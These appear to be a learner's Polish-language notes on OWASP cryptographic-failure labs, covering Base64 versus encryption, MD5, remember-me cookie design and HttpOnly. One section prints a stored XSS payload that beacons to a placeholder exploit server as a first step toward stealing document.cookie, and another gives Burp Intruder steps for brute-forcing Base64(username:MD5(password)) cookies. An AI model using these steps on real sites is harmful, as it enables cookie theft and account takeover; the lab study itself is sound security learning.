# A04:2025 - Cryptographic Failures Learning Notes

Te notatki zachowują dłuższe refleksje z labów A04.

Krótsze dowody i przebieg labów są w [02-labs-or-practice.md](02-labs-or-practice.md).

## Czego nauczyłem się o Base64

Na początku traktowałem Base64 trochę jak coś, co "chroni" wartość.

Ważna korekta:

> Base64 nie jest encryption. To encoding.

Base64 nie używa sekretnego klucza. Każdy może je zdekodować.

W labie zdekodowanie cookie `stay-logged-in` ujawniło strukturę:

```text
username:md5(password)
```

To pokazało, że aplikacja nie chroniła danych. Tylko reprezentowała je w innym formacie.

## Czego nauczyłem się o MD5

Początkowo opisywałem MD5 jako "broken". Kierunek był dobry, ale lepsze wyjaśnienie jest bardziej konkretne:

- MD5 jest stary,
- MD5 jest bardzo szybki,
- MD5 nie nadaje się do ochrony haseł,
- atakujący mogą szybko testować duże wordlisty,
- słabe hasła można łamać offline,
- MD5 nie powinien być używany w security związanym z hasłami.

Dla przechowywania haseł nowoczesne aplikacje powinny używać adaptacyjnego, solonego hashowania haseł, takiego jak Argon2, bcrypt, scrypt albo PBKDF2 tam, gdzie ma to sens.

Jednak cookie remember-me w ogóle nie powinno zawierać hasha hasła.

## Czego nauczyłem się o tokenach remember-me

Podatny wzorzec cookie wyglądał tak:

```text
Base64(username:MD5(password))
```

Jest słaby, bo jest przewidywalny.

Jeśli atakujący zna username i może zgadywać hasła-kandydatów, może budować candidate cookies:

```text
Base64(username:MD5(candidate-password))
```

Bezpieczniejszy token remember-me powinien być losowy, mieć wysoką entropię, być przechowywany i walidowany po stronie serwera, wygasać i dać się odwołać.

## Czego nauczyłem się o HttpOnly

W pierwszym labie cookie `stay-logged-in` nie miało `HttpOnly`.

To oznaczało, że JavaScript mógł je odczytać:

```js
document.cookie
```

Miało to znaczenie, bo stored XSS pozwalał przeglądarce ofiary wysłać cookie do exploit server.

Ważne doprecyzowanie:

> `HttpOnly` nie naprawia XSS. Zmniejsza impact XSS, blokując JavaScriptowi odczyt chronionych cookies.

XSS nadal trzeba naprawić osobno.

## Lab 1: co było trudne

Pierwszy lab zajął więcej czasu, bo był łańcuchem kilku problemów.

Musiałem zrozumieć:

1. czym jest cookie `stay-logged-in`,
2. jak zdekodować je z Base64,
3. co oznacza `username:hash`,
4. czy hash bazuje na username czy password,
5. dlaczego `HttpOnly=false` ma znaczenie,
6. jak stored XSS może czytać cookies,
7. jak wysłać `document.cookie` do exploit server,
8. dlaczego log exploit server najpierw nie pokazywał cookie,
9. jak debugować payload prostym pingiem,
10. jak skradziony hash prowadzi do offline cracking i account takeover.

Przydatnym krokiem debugowania było najpierw wysłanie prostego requestu:

```html
<script>
new Image().src='https://<exploit-server>/exploit?ping=1';
</script>
```

Dopiero po potwierdzeniu, że ping dotarł do exploit server, przeszedłem do wysłania:

```js
document.cookie
```

To pomogło rozdzielić dwa problemy:

- czy payload XSS się wykonuje,
- czy exfiltracja cookie działa.

## Lab 2: czego nauczyłem się o Burp Intruder

Drugi lab był szybszy, ale nauczył mnie ważnej umiejętności w Burp.

Użyłem Intrudera nie tylko do wstawiania payloadów, ale do ich przekształcania.

Docelowy format cookie:

```text
Base64(carlos:MD5(candidate-password))
```

W Intruder każde hasło z wordlisty było przetwarzane przez:

```text
1. Hash: MD5
2. Add prefix: carlos:
3. Encode: Base64
```

To automatycznie generowało candidate values dla cookie `stay-logged-in`.

Wcześniej nie używałem Intruder payload processing w ten sposób.

Praktyczna lekcja:

> Burp Intruder może przekształcać payloady przed wysłaniem. To przydatne, gdy podatna aplikacja oczekuje wartości strukturalnej albo zakodowanej.

## Pytania, które zadawałem podczas labów

Główne pytania z procesu nauki:

- Czy Burp ma Base64 encode/decode?
- Co oznacza ta zdekodowana wartość cookie?
- Czy hash bazuje na username czy password?
- Dlaczego Base64 nie jest encryption?
- Dlaczego MD5 jest słaby w tej sytuacji?
- Co zmienia `HttpOnly=false`?
- Dlaczego exploit server nie pokazuje mojego payloadu?
- Czy exploit URL powinien zawierać `/exploit`?
- Jak sprawić, żeby Intruder generował wartości `Base64(username:MD5(password))`?
- Jak rozpoznać poprawną odpowiedź Intrudera?

Warto to zachować w notatkach, bo pokazuje realną ścieżkę nauki, nie tylko finalną odpowiedź.

## Co w końcu kliknęło

Najważniejsze było zrozumienie, że cookie nie było bezpiecznym tokenem.

Wyglądało jak token, ale w rzeczywistości było przewidywalną strukturą danych:

```text
username:password_hash
```

a potem Base64 encoded.

Kiedy format był znany, istniały dwie ścieżki ataku:

1. ukraść cookie ofiary i złamać hash offline,
2. wygenerować candidate cookies bezpośrednio w Intruder.

Obie działały, bo projekt remember-me był słaby.

## Różnica między hashing, encoding i encryption

### Encoding

Encoding zmienia sposób reprezentacji danych.

Przykład:

```text
Base64
```

Jest odwracalny bez sekretnego klucza.

### Hashing

Hashing z założenia jest jednokierunkowy, ale szybkie hashe takie jak MD5 są słabe dla haseł.

Dla haseł używa się wolnego, adaptacyjnego hashowania haseł.

### Encryption

Encryption chroni dane przy użyciu klucza i jest odwracalne tylko z kluczem.

Lab nie pokazywał encryption. Pokazywał Base64 encoding plus MD5 hashing.

## Real-world review angle

W realnej aplikacji sprawdziłbym:

- format cookie remember-me,
- czy cookies dekodują się do znaczących wartości,
- czy wartości pochodzące od hasła są wysyłane do przeglądarki,
- czy cookies mają `HttpOnly`, `Secure` i `SameSite`,
- czy persistent tokens wygasają,
- czy tokeny można odwołać,
- czy zmiana hasła unieważnia stare tokeny,
- czy tokeny są losowe i mają wysoką entropię,
- czy wrażliwe tokeny są przechowywane w storage czytelnym dla JavaScript,
- czy słabe hashowanie typu MD5 albo SHA1 występuje w flow uwierzytelniania.

## Podsumowanie

Najważniejsze punkty z A04:

1. Base64 to encoding, nie encryption.
2. MD5 jest słaby i zbyt szybki do ochrony haseł.
3. Cookies remember-me nie powinny zawierać hashy haseł.
4. `HttpOnly` ma znaczenie, gdy XSS może czytać cookies.
5. Przewidywalny token można wygenerować albo brute-force'ować, jeśli jego format jest znany.
6. Bezpieczne tokeny remember-me powinny być losowe, walidowane po stronie serwera, wygasające i odwoływalne.
7. Burp Intruder payload processing można wykorzystać do testowania słabych strukturalnych projektów tokenów.
